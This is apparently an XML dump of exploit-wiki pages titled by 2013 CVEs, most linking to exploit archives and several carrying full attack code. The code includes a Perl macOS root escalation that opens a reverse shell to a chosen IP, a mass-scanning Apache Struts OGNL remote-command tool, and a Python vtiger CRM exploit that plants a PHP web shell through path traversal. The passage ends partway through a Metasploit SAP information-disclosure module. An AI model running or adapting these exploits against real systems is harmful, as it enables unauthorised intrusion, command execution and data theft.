        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== https://github.com/JustYoomoon/Exploit/blob/main/cve-2013-1300.zip"</comment>
      <origin>1011</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="74" sha1="3xa4csukty2lz10oqcsi9ycn1qk7krc" xml:space="preserve">==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/cve-2013-1300.zip</text>
      <sha1>3xa4csukty2lz10oqcsi9ycn1qk7krc</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2013-1488 Oracle Java SE 7 Update 17 任意代碼執行漏洞</title>
    <ns>0</ns>
    <id>764</id>
    <revision>
      <id>1012</id>
      <timestamp>2021-04-06T02:31:50Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== https://github.com/JustYoomoon/Exploit/blob/main/cve-2013-1488.zip"</comment>
      <origin>1012</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="74" sha1="fjm32nf7wnrywjmz5li62jd9yzzqfvz" xml:space="preserve">==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/cve-2013-1488.zip</text>
      <sha1>fjm32nf7wnrywjmz5li62jd9yzzqfvz</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2013-1775 Apple Mac OSX 10.8.4 權限提升漏洞</title>
    <ns>0</ns>
    <id>765</id>
    <revision>
      <id>1013</id>
      <timestamp>2021-04-06T02:32:46Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; #!/usr/bin/env perl  $num_args = $#ARGV + 1; if ($num_args != 2) {     print "\nUsage: exploit.pl ip.add.re.ss port\n";     exit; }  print "\n"; print "=========..."</comment>
      <origin>1013</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="909" sha1="rkhdv24sfnvp9x2xfnbv6cwh9u7ld41" xml:space="preserve">==EXP==
&lt;pre&gt;
#!/usr/bin/env perl

$num_args = $#ARGV + 1;
if ($num_args != 2) {
    print "\nUsage: exploit.pl ip.add.re.ss port\n";
    exit;
}

print "\n";
print "=============================================================================================================\n";
print " - OSX &lt;= 10.8.4 Local Root Priv Escalation Root Reverse Shell by ";
print " - [Bek Umarov @ HackEd]\n";
print " - Reference: http://www.exploit-db.com/exploits/27965/\n";
print "=============================================================================================================\n";
print "\n";


my $ipaddr = @ARGV[0];
my $port   = @ARGV[1];

my $proc = `systemsetup -setusingnetworktime Off -settimezone GMT -setdate 01:01:1970 -settime 00:00;sudo su -c "bash -i &gt;&amp; /dev/tcp/$ipaddr/$port 0&gt;&amp;1 &amp;"`;

print "[*] Exploit has been performed. You should have a shell on ipaddr: $ipaddr and port $port\n\n";

&lt;/pre&gt;</text>
      <sha1>rkhdv24sfnvp9x2xfnbv6cwh9u7ld41</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2013-1965 Apache Struts 2漏洞</title>
    <ns>0</ns>
    <id>766</id>
    <revision>
      <id>1014</id>
      <timestamp>2021-04-06T02:33:52Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==POC== &lt;pre&gt; use strict;  use warnings; use Parallel::ForkManager; use IO::Socket; use Getopt::Long; use IO::Socket::SSL;  our %workers;  #./script ip/host # options: # --sca..."</comment>
      <origin>1014</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="13332" sha1="mhecnxg6fnod84p83uycoz5pru1rj1j" xml:space="preserve">==POC==
&lt;pre&gt;
use strict; 
use warnings;
use Parallel::ForkManager;
use IO::Socket;
use Getopt::Long;
use IO::Socket::SSL;

our %workers;

#./script ip/host
# options:
# --scan
#   --ipcount (used with --scan)
#   --threads=50 (used with --scan)
# --port=8080 (default: all ports)
# --path=/what/ever.action (default: all paths)
# --ssl
# --force (ignores regex for struts detection)
# --timeout=seconds (default: 1)
# --cmd="some command"
# --debug=1-3 1=important output, 2=all output, 3=no output (default:1)
# --log=1/2 yes/no (default:1)
# --logfile=somefile (default:appends log.txt)


my @ports=('80','8080','8088','9080','9081','9082','9083');
my @portssl=('9443,9444'); #not in use
my @paths=(
'/Hello_World_Struts2_Ant/index.action',
'/Wildcard_Method_Struts2_Mvn/Person.action',
'/Basic_Struts2_Ant/index.action',
'/struts2-showcase-2.0.6/tiles/index.action',
'/struts2-jquery-showcase-3.6.0/index.action',
'/struts2-jquery-showcase/index.action',
'/struts2-blank/example/Menu.action',
'/blank/example/Menu.action',
'/struts2-showcase/viewSource.action',
'/Interceptors_Struts2_Ant/index.action',
'/Form_XML_Validation_Struts2_Ant/index.action',
'/Using_Tags_Struts2_Ant/index.action',
'/Spring_Struts2_Ant/index.action',
'/Form_Validation_Struts2_Ant/index.action',
'/struts2/index.action',
'/index.action'
);
my @jbosspaths = ('/struts2-jboss-blank/example/Menu.action','/struts2-blank/example/Menu.action','/jboss-blank/example/Menu.action','/blank/example/Menu.action','/index.action','/struts2/index.action');

my ($path,$port,$ssl,$scan,$threads,$ipcount,$force,$type,$timeout,$cmd,$debug,$log,$logfile) = "";

GetOptions ("ipcount=i" =&gt; \$ipcount,
            "timeout=i" =&gt; \$timeout,
            "debug=i" =&gt; \$debug,
            "log=i" =&gt; \$log,
            "logfile=s" =&gt; \$logfile,
            "cmd=s" =&gt; \$cmd,
            "scan" =&gt; \$scan,
            "port=s" =&gt; \$port,
            "threads=i" =&gt; \$threads,
            "path=s"   =&gt; \$path,
            "ssl"   =&gt; \$ssl,
            "force"   =&gt; \$force)
  or die("Error in command line arguments\n");
  
if (!$log) { $log = 1; }
if (!$logfile) { $logfile = 'log.txt'; }
if (!$debug) { $debug = 1; }
if (!$timeout) { $timeout = 1; } 
use constant PATIENCE =&gt; $timeout; # seconds
if ($path) { @paths=($path); }  
if ($port) { @ports=($port); } 
if (!$ipcount) { $ipcount = 1; }
if (!$threads) { $threads = 1; }
my @target=split('\.',$ARGV[0]); #123.123.123.1

main();


sub main {
  outp("Threads Set: $threads",1);
  outp("Number of IPs to Scan: $ipcount",1);
  outp("Paths Loaded: ". ($#paths + 1),1);
  outp("Ports Loaded: ". ($#ports + 1),1);
  if ($log == 1) { outp("Using Log File: $logfile",1); }
  else { outp("Using Log File: No",1); }
  outp("Output Level: ". $debug,1);
  outp("Starting Apache Struts Scanner..\n",1);
  
  if ($scan) {
    if ($threads &gt; 1) {
      my $pm = Parallel::ForkManager-&gt;new($threads);
      $pm-&gt;run_on_wait(\&amp;dismiss_hung_workers, 1);  # 1 second between callback invocations
      for my $id (1 .. $ipcount) {
        if (my $pid = $pm-&gt;start) {
          $workers{$pid} = time();
          next;
        }
        my $ip = getip();
	   scan($ip,$id);
       $pm-&gt;finish;
      }
      $pm-&gt;wait_all_children;
    }
    else { 
      for (1 .. $ipcount) {
      my $ip = getip();
	  scan($ip,'1');
      }
    }
  }
  elsif ($cmd) { rce($ARGV[0],$cmd); }
  else { scan($ARGV[0],'1'); }
  outp("\nApache Struts Scanner Finished.",1);
}
sub dismiss_hung_workers {
  while (my ($pid, $started_at) = each %workers) {
    next unless time() - $started_at &gt; PATIENCE;
    kill TERM =&gt; $pid;
    delete $workers{$pid};
  }
}
sub getip {
  if ($target[3] == 255) { 
    if ($target[2] == 255) { 
	  if ($target[1] == 255) { 
	    if ($target[0] == 255) { outp("wtf are you doing?",1);exit; }
		else { $target[1] = 0; $target[2] = 0; $target[3] = 0; $target[0] = ($target[0] + 1); };
	  }
	  else { $target[2] = 0; $target[3] = 0; $target[1] = ($target[1] + 1); };
	}
	else { $target[3] = 0; $target[2] = ($target[2] + 1); };
  }
  else { $target[3] = ($target[3] + 1); }
  return "$target[0].$target[1].$target[2].$target[3]";
}
sub scan {
my $id = "\[tID: $_[1]\]:";
my $joinports = join(',',@ports);
outp("$id Scanning IP: ".$_[0]." (ports: $joinports)",2);
foreach my $port (@ports) {  
  my $req = " HTTP/1.1\r\n"
  . "Host: $_[0]\r\n"
  . "Referer: http://$_[0]\r\n"
  . "User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.68 Safari/534.24\r\n"
  . "Accept: application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n"
  . "Accept-Encoding: *\r\n"
  . "Accept-Language: en-US;q=0.6,en;q=0.4\r\n"
  . "Accept-Charset: windows-1251,utf-8;q=0.7,*;q=0.3\r\n"
  . "Connection: close\r\n\r\n";
  my ($sock,$check,$socket,$filter) = "";
  if (!$force) {
    #attempts to id the server and detect a page to test
    $socket= IO::Socket::INET-&gt;new(PeerAddr=&gt;"$_[0]:$port",Proto=&gt;'tcp',Timeout=&gt;$timeout);
    if ($ssl) { $socket= IO::Socket::SSL-&gt;new(PeerHost =&gt; "$_[0]",PeerPort =&gt; "$port",Timeout=&gt;$timeout); }
    if ($socket) {  
  	  $check = "GET /";
      print $socket $check.$req;
      while (&lt;$socket&gt;) { $sock = $sock.$_; }
      $socket-&gt;close();
	  if ($sock =~ /(Tomcat|Apache-Coyote|Glassfish|JBoss|Websphere|Weblogic|\.action|JSESSIONID|The document has moved|Moved Temporarily|Apache)/) { $filter = 1;$type=$1; }
	  my $detect = "";
	  if ($sock =~ /(location\=\"(.*)\"\;)/ and length($sock) &lt; 500) { $detect = "$2"; }
	  elsif ($sock =~ /(window.open.?\(\'(.*)\))/) { 
		my $found = $2;
	    my @split = split("'", $found);
	    if ($split[0] =~ /;/) {
	      my @split = split(';', $split[0]);
		  if ($split[0]) { $found = $split[0]; }
		}
		else { $found = $split[0]; }
		if ($found =~ /^\/.*\.action$/) { outp("Valid path found to test0: $found",2); @paths=($found); $filter = 1;$type="auto"; }
		else { $detect = "$found";outp("Redirect Found#0: $found",2); }
	  }
	  elsif ($sock =~ /(The document has moved.*href.?\"(.*)\"&gt;)/) { 
	    my $cut = $2;
	    print "here: $cut\n";
	    if ($cut =~ /http/) {
			#print "here:3\n";
			my @split = split('/', $cut);
			my $eee = "";
			foreach (3..$#split) { $eee = $eee."/".$split[$_]; }
			if ($eee =~ /^\/.*\.action$/) { outp("$id Valid path found to test3: $eee",2); @paths=($eee); $filter = 1;$type="auto"; }
			elsif ($eee =~ /^\//){ $detect = "$eee";  }#outp("$id Redirect Found#4: $eee",2); }
		}
		elsif ($cut =~ /^(\/.*\.action)$/) { my $found = $1;outp("$id Valid path found to test3: $found",2); @paths=($found); $filter = 1;$type="auto"; }
		elsif ($cut =~ /^(\/.*\/)$/) { $detect= $1; outp("Redirect Found#3: $detect",2); }
	  }
	#}
	  else { print "$id SOCKc: $sock\n";$socket-&gt;close();next; }
      if ($detect) {
	    #print "$id Redirect Detected: $detect\n"; 
		$socket= IO::Socket::INET-&gt;new(PeerAddr=&gt;"$_[0]:$port",Proto=&gt;'tcp',Timeout=&gt;$timeout);
        if ($ssl) { $socket= IO::Socket::SSL-&gt;new(PeerHost =&gt; "$_[0]",PeerPort =&gt; "$port",Timeout=&gt;$timeout); }
        if ($socket) {  
  	      $check = "GET $detect/";
          print $socket $check.$req;
		  $sock = "";
          while (&lt;$socket&gt;) { $sock = $sock.$_; }
		  print "$id Followed Redirect to: $detect\n"; 
		  if ($sock =~ /(Tomcat|Apache-Coyote|Glassfish|JBoss|Websphere|Weblogic|\.action|JSESSIONID|The document has moved|Moved Temporarily|Apache)/) { $filter = 1;$type=$1; }
		  if ($sock =~ /(window\.open.?\(\'(.*)\))/) { 
		    my $found = $2;
			my @split = split("'", $found);
			if ($split[0] =~ /;/) {
			  my @split = split(';', $split[0]);
			  if ($split[0]) { $found = $split[0]; }
			}
			else { $found = $split[0]; }
			if ($found =~ /^\/.*\.action$/) { outp("$id Valid path found to test1: $found",2);@paths=($found); $filter = 1;$type="auto"; }
			else { outp("Debug Redirect Found#1: $found",2); }
		  }
		  elsif ($sock =~ /(location\=\"(.*)\"\;)/) {
		    my $found = $2;
		    if ($found =~ /^\/.*\.action$/) { outp("$id Valid path found to test2: $found",2);@paths=($found); $filter = 1;$type="auto"; }
			elsif ($found =~ /http/) {
			  #print "here:4\n";
			  my @split = split('/', $found);
			  my $eee = "";
			  foreach (3..$#split) { $eee = $eee."/".$split[$_]; }
			  if ($eee =~ /^\/.*\.action$/) { outp("Valid path found to test3: $eee",2); @paths=($eee); $filter = 1;$type="auto"; }
			  else { outp("Debug Redirect Found#2: $found",2); }
		    }
			else { outp("Debug Redirect Found#1: $found",2); }
		  }
		  elsif ($sock =~ /(Location\: (.*)\n)/) {
		    my $found = $2;
			$found =~ s/\n//g;
	        $found =~ s/\r//g;
		    if ($found =~ /^\/.*\.action$/) { outp("Valid path found to test4: $found",2);@paths=($found); $filter = 1;$type="auto"; }
			elsif ($found =~ /http/) {
			  #print "here:4\n";
			  my @split = split('/', $found);
			  my $eee = "";
			  foreach (3..$#split) { $eee = $eee."/".$split[$_]; }
			  if ($eee =~ /^\/.*\.action$/) { outp("$id Valid path found to test: $eee",2); @paths=($eee); $filter = 1;$type="auto"; }
			  else { outp("$id Debug Redirect Found#4: $eee",2); }
		    }
			else { outp("$id Debug Redirect Found#3: $found",2); }
		  }
          $socket-&gt;close();#print $sock."\n";
	    }
	  }
	
    }
	 else { outp("$id SOCK: error",2);next; }
  }
  if (($filter == 1) or ($force)) { 
    if ($force) { $type = "forced"; }
	outp("$id \"$type\" detected on: $_[0]:$port",2); 
	outp("$id Now Checking for Struts..",2);
	foreach my $p (@paths) {
	if (!$ssl) { $socket= IO::Socket::INET-&gt;new(PeerAddr=&gt;"$_[0]:$port",Proto=&gt;'tcp',Timeout=&gt;$timeout); }
	else { $socket= IO::Socket::SSL-&gt;new(PeerHost =&gt; "$_[0]",PeerPort =&gt; "$port",Timeout=&gt;$timeout); }
	if ($socket) { 
	  $check = "GET $p";
	  print $socket $check.$req;
	  $sock = "";
	  if (&lt;$socket&gt; =~ /200 OK/) { 
	    outp("$id Apache Struts Found! (path verified)",2); 
		outp("$id Checking if Struts is Vuln.. (trying ". ( $#paths + 1) ." paths)",2);
		$socket-&gt;close();
	    if (!$ssl) { $socket= IO::Socket::INET-&gt;new(PeerAddr=&gt;"$_[0]:$port",Proto=&gt;'tcp',Timeout=&gt;$timeout); }
		else { $socket= IO::Socket::SSL-&gt;new(PeerHost =&gt; "$_[0]",PeerPort =&gt; "$port",Timeout=&gt;$timeout); }
	    if ($socket) { 
	      $check = "GET $p?redirect:%25{new%20java.io.File('.').getCanonicalPath().concat({3*8888})}";
	      print $socket $check.$req;
	      $sock = "";
	      while (&lt;$socket&gt;) { $sock = $sock.$_; }
	      if ($sock =~ /\:\/\/(.*)\[26664/) { 
		    my $match = "";
			my @split = split('/',$p);
			if ($split[1]) {
			  @split = split($split[1],$1);
			  if ($split[1]) { $match = $split[1]; }
			}
		    if ($match =~ /\:/) { outp("$id Apache Struts Vuln Found (Windows: $match): $_[0]:$port $p (CVE: 2013-2251)",1); }
			elsif ($match) { outp("$id Apache Struts Vuln Found (Linux: $match): $_[0]:$port $p (CVE: 2013-2251)",1); }
			else { outp("$id Apache Struts Vuln Found (Linux: unknown_path): $_[0]:$port $p (CVE: 2013-2251)",1); }
		  }
		  #else { outp("$id Apache Struts Vuln Not Found!\n$sock",2); } #extra debug
		  else { outp("$id Apache Struts Vuln Not Found!\n",2); }
		  $socket-&gt;close();
		}
		else { outp("$id Socket Error #1",2); }
		last;
	  }
	  else { $socket-&gt;close(); }
	} 
	else { outp("$id Socket Error #0",2); } 
	outp("$id No Struts Found!",2);
	}
  }
  #else { outp("SOCK: $sock",2); $socket-&gt;close(); } extra debug
  else { ouutp("$id Doesnt match filter!",2);$socket-&gt;close(); }
 # }
}
}
sub rce {
  my $cmd = $_[1];
  $cmd =~ s/ /'\,'/g;
  $cmd = "'$cmd'";
  #print "cmd: $cmd\n";
  my $socket= IO::Socket::INET-&gt;new(PeerAddr=&gt;"$_[0]:$ports[0]",Proto=&gt;'tcp',Timeout=&gt;$timeout);
  if ($ssl) { $socket= IO::Socket::SSL-&gt;new(PeerHost =&gt; "$_[0]",PeerPort =&gt; "$ports[0]",Timeout=&gt;$timeout); }
  if ($socket) {  
    my $p = $paths[0];
	my @split = ();
	my $c = "%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{$cmd})).start()}";
	my $check = "GET $p?redirect:$c";
	my $full = "($_[0]:$ports[0]$p?redirect:$c)";
	#print "check: $check\n";
	my $req = " HTTP/1.1\r\n"
  . "Host: $_[0]\r\n"
  . "Referer: http://$_[0]\r\n"
  . "User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.68 Safari/534.24\r\n"
  . "Accept: application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n"
  . "Accept-Encoding: *\r\n"
  . "Accept-Language: en-US;q=0.6,en;q=0.4\r\n"
  . "Accept-Charset: windows-1251,utf-8;q=0.7,*;q=0.3\r\n"
  . "Connection: close\r\n\r\n";
    print $socket $check.$req;
    my $sock = "";
	#print &lt;$socket&gt;;
    while (&lt;$socket&gt;) { 
	  if ($_ =~ /Location/)  { @split = split('/',$_); }
	}
	my $match = "";
	if ($split[0] and $split[0] =~ /http/) { 
	  $match = $split[$#split];
	}
	if (!$match) { $match = "error_no_results"; }
	$match =~ s/\n//g;
	$match =~ s/\r//g;
	outp("Result: $match",1,$full);
    $socket-&gt;close();
  }
}

sub outp {
#1 debug output level 1 (more important)
#2 debug output all 
#3 no ouput
  my $data = $_[0];
  my $write = $_[1];
  my $extra = "";
  my $log1 = 0;
  if ($_[2]) { $extra = $_[2]; }
  
  if ($write == 2 and $debug == 2) { print $data."\n";$log1=1; }
  elsif ($write == 1 and $debug &lt;= 2) { print $data."\n";$log1=1; }
  if ($log == 1 and $log1 == 1) {
    open(LOG, '&gt;&gt;'.$logfile);
    if ($extra) { print LOG $extra."\n".$data."\n"; }
    else { print LOG $data."\n"; }
    close(LOG);
  }
}

&lt;/pre&gt;</text>
      <sha1>mhecnxg6fnod84p83uycoz5pru1rj1j</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2013-2072 Xen 4.0.x, 4.1.x, and 4.2.x 特權提升漏洞</title>
    <ns>0</ns>
    <id>767</id>
    <revision>
      <id>1015</id>
      <timestamp>2021-04-06T02:36:33Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== https://github.com/JustYoomoon/Exploit/blob/main/cve-2013-2072.zip"</comment>
      <origin>1015</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="74" sha1="5afhulpykr7fvns1duiolpdjm67mrur" xml:space="preserve">==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/cve-2013-2072.zip</text>
      <sha1>5afhulpykr7fvns1duiolpdjm67mrur</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2013-2094 Linux kernel before 3.8.9 特權提升漏洞</title>
    <ns>0</ns>
    <id>768</id>
    <revision>
      <id>1016</id>
      <timestamp>2021-04-06T02:38:43Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== https://github.com/JustYoomoon/Exploit/blob/main/cve-2013-2094.zip"</comment>
      <origin>1016</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="74" sha1="as1f12fbtv676t5pcaqc209kjhk59li" xml:space="preserve">==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/cve-2013-2094.zip</text>
      <sha1>as1f12fbtv676t5pcaqc209kjhk59li</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2013-2729 Adobe Reader任意代碼執行漏洞</title>
    <ns>0</ns>
    <id>769</id>
    <revision>
      <id>1017</id>
      <timestamp>2021-04-06T02:42:54Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== https://github.com/JustYoomoon/Exploit/blob/main/CVE-2013-2729.zip"</comment>
      <origin>1017</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="74" sha1="dnlkp3tk9ie0bg27tbqxyg4eerm4x3r" xml:space="preserve">==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/CVE-2013-2729.zip</text>
      <sha1>dnlkp3tk9ie0bg27tbqxyg4eerm4x3r</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2013-2730 Adobe Reader任意代碼執行漏洞</title>
    <ns>0</ns>
    <id>770</id>
    <revision>
      <id>1018</id>
      <timestamp>2021-04-06T02:44:42Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== https://github.com/JustYoomoon/Exploit/blob/main/CVE-2013-2730.zip"</comment>
      <origin>1018</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="74" sha1="tcv0efuxn671x3nii68q4vjmlw2er77" xml:space="preserve">==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/CVE-2013-2730.zip</text>
      <sha1>tcv0efuxn671x3nii68q4vjmlw2er77</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2013-2977 Windows任意代碼執行漏洞</title>
    <ns>0</ns>
    <id>771</id>
    <revision>
      <id>1019</id>
      <timestamp>2021-04-06T02:46:19Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== https://github.com/JustYoomoon/Exploit/blob/main/CVE-2013-2977.zip"</comment>
      <origin>1019</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="74" sha1="tdhtsy72muvm1l6hj4pwxu12sdqv4ks" xml:space="preserve">==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/CVE-2013-2977.zip</text>
      <sha1>tdhtsy72muvm1l6hj4pwxu12sdqv4ks</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2013-3214 vtiger CRM 5.4.0 PHP代碼注入漏洞</title>
    <ns>0</ns>
    <id>772</id>
    <revision>
      <id>1020</id>
      <timestamp>2021-04-06T02:49:13Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; #!/usr/bin/env python3  import requests from base64 import b64encode  # parameters depend on environment. host = '192.168.85.133' port = 8888 uri = '/'  url = f'..."</comment>
      <origin>1020</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1601" sha1="qxzj3k8odta10xy4kqmo5c0ov0v7g25" xml:space="preserve">==EXP==
&lt;pre&gt;
#!/usr/bin/env python3

import requests
from base64 import b64encode

# parameters depend on environment.
host = '192.168.85.133'
port = 8888
uri = '/'

url = f'http://{host}:{port}{uri}vtigerservice.php?service=outlook'

headers = {'Content-Type': 'text/xml', 'charset': 'UTF-8'}


payload = """
&lt;?php
if(isset($_REQUEST['cmd'])){
        echo "&lt;pre&gt;";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "&lt;/pre&gt;";
        die;
}
?&gt;
"""

encoded_payload = b64encode(payload.encode()).decode()
filename = "cmd.php"

data = f"""
&lt;soapenv:Envelope xmlns:crm="http://www.vtiger.com/products/crm" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
	&lt;soapenv:Header/&gt;
	&lt;soapenv:Body&gt;
		&lt;crm:AddEmailAttachment soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"&gt;
			&lt;emailid xsi:type="xsd:string"&gt;ptFINT&lt;/emailid&gt;
			&lt;filedata xsi:type="xsd:string"&gt;{encoded_payload}&lt;/filedata&gt;
			&lt;filename xsi:type="xsd:string"&gt;../../../../../../{filename}&lt;/filename&gt;
			&lt;filesize xsi:type="xsd:string"&gt;{len(payload)}&lt;/filesize&gt;
			&lt;filetype xsi:type="xsd:string"&gt;php&lt;/filetype&gt;
			&lt;username xsi:type="xsd:string"&gt;Pbghh&lt;/username&gt;
			&lt;session xsi:type="xsd:string"/&gt;
		&lt;/crm:AddEmailAttachment&gt;
	&lt;/soapenv:Body&gt;
&lt;/soapenv:Envelope&gt;
"""

# send the requests

print("Sending ...")
print(data)
requests.post(url, headers=headers, data=data)

print("Test command whoami ...")
resp = requests.get(f'http://{host}:{port}{uri}{filename}?cmd=whoami')

print(resp.text)

&lt;/pre&gt;</text>
      <sha1>qxzj3k8odta10xy4kqmo5c0ov0v7g25</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2013-3319 SAP Netweaver 7.03 敏感信息泄漏漏洞</title>
    <ns>0</ns>
    <id>773</id>
    <revision>
      <id>1021</id>
      <timestamp>2021-04-06T02:50:44Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; require 'msf/core' require 'rexml/document'  class Metasploit4 &lt; Msf::Auxiliary  	include Msf::Exploit::Remote::HttpClient 	include Msf::Auxiliary::Report 	inclu..."</comment>
      <origin>1021</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="6735" sha1="56j8wrmrlu4l6c0ccw574uq01r2u28d" xml:space="preserve">==EXP==
&lt;pre&gt;
require 'msf/core'
require 'rexml/document'

class Metasploit4 &lt; Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name'         =&gt; 'SAP Host Agent Information Disclosure',
			'Description'  =&gt; %q{
				This module attempts to retrieve Computer and OS info from Host Agent
through the SAP HostControl service
				},
			'References'   =&gt;
				[
					# General
					[ 'CVE', '2013-3319'],
					[ 'URL', 'https://service.sap.com/sap/support/notes/1816536' ],
				    [ 'URL', 'http://labs.integrity.pt/advisories/cve-2013-3319/']
				],
			'Author'       =&gt;
				[
					'Bruno Morisson &lt;bm[at]integrity.pt&gt;'
				],
			'License'      =&gt; MSF_LICENSE
		)

		register_options(
			[
				Opt::RPORT(1128)
			], self.class)

		register_autofilter_ports([ 1128 ])
		deregister_options('RHOST')
		deregister_options('VHOST')

	end

	def run_host(rhost)

		rport = datastore['RPORT']

		print_status("Connecting to SAP Host Control SOAP Interface on #{rhost}:#{rport}")

		success = false
		fault = false

		data = '&lt;?xml version="1.0" encoding="utf-8"?&gt;'
		data &lt;&lt; '&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"'
		data &lt;&lt; 'xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xs="http://www.w3.org/2001/XMLSchema"&gt;'
		data &lt;&lt; '&lt;SOAP-ENV:Header&gt;&lt;sapsess:Session xlmns:sapsess="http://www.sap.com/webas/630/soap/features/session/"&gt;'
		data &lt;&lt; '&lt;enableSession&gt;true&lt;/enableSession&gt;&lt;/sapsess:Session&gt;&lt;/SOAP-ENV:Header&gt;&lt;SOAP-ENV:Body&gt;'
		data &lt;&lt; '&lt;ns1:GetComputerSystem xmlns:ns1="urn:SAPHostControl"&gt;&lt;aArguments&gt;&lt;item&gt;'
		data &lt;&lt; '&lt;mKey&gt;provider&lt;/mKey&gt;&lt;mValue&gt;saposcol&lt;/mValue&gt;&lt;/item&gt;&lt;/aArguments&gt;&lt;/ns1:GetComputerSystem&gt;'
		data &lt;&lt; "&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt;\r\n\r\n"

		begin

			res = send_request_raw({
				'uri'      =&gt; "/#{datastore['URI']}",
				'method'   =&gt; 'POST',
				'data'     =&gt; data,
				'headers'  =&gt;
					{
						'Content-Length' =&gt; data.length,
						'SOAPAction'	=&gt; '""',
						'Content-Type'  =&gt; 'text/xml; charset=UTF-8',
					}
			    }, 15)

        	if res and res.code == 200

				print_good("Got response from server, parsing...")

				env = []
				saptbl =[]
				totalitems=0

				saptbl[0] = Msf::Ui::Console::Table.new(
					Msf::Ui::Console::Table::Style::Default,
					'Header'    =&gt; "Remote Computer Listing",
					'Prefix'  =&gt; "\n",
					'Postfix' =&gt; "\n",
					'Indent'    =&gt; 1,
					'Columns'   =&gt;
						[
							"Names",
							"Hostnames",
							"IPAddresses"
						])

				saptbl[1] = Msf::Ui::Console::Table.new(
					Msf::Ui::Console::Table::Style::Default,
					'Header'    =&gt; "Remote OS Listing",
					'Prefix'  =&gt; "\n",
					'Postfix' =&gt; "\n",
					'Indent'    =&gt; 1,
					'Columns'   =&gt;
						[
							"Name",
							"Type",
							"Version",
							"TotalMemSize",
							"Load Avg 1m",
							"Load Avg 5m",
							"Load Avg 15m",
							"CPUs",
							"CPU User",
							"CPU Sys",
							"CPU Idle"
						])

				saptbl[2] = Msf::Ui::Console::Table.new(
					Msf::Ui::Console::Table::Style::Default,
					'Header'    =&gt; "Remote Process Listing",
					'Prefix'  =&gt; "\n",
					'Postfix' =&gt; "\n",
					'Indent'    =&gt; 1,
					'Columns'   =&gt;
						[	"Name",
						     "PID",
						     "Username",
						     "Priority",
						     "Size",
						     "Pages",
						     "CPU",
						     "CPU Time",
						     "Command"
						])

				saptbl[3] = Msf::Ui::Console::Table.new(
					Msf::Ui::Console::Table::Style::Default,
					'Header'    =&gt; "Remote Filesystem Listing",
					'Prefix'  =&gt; "\n",
					'Postfix' =&gt; "\n",
					'Indent'    =&gt; 1,
					'Columns'   =&gt;
						[	"Name",
						     "Size",
						     "Available",
						     "Remote"
						])

				saptbl[4] = Msf::Ui::Console::Table.new(
					Msf::Ui::Console::Table::Style::Default,
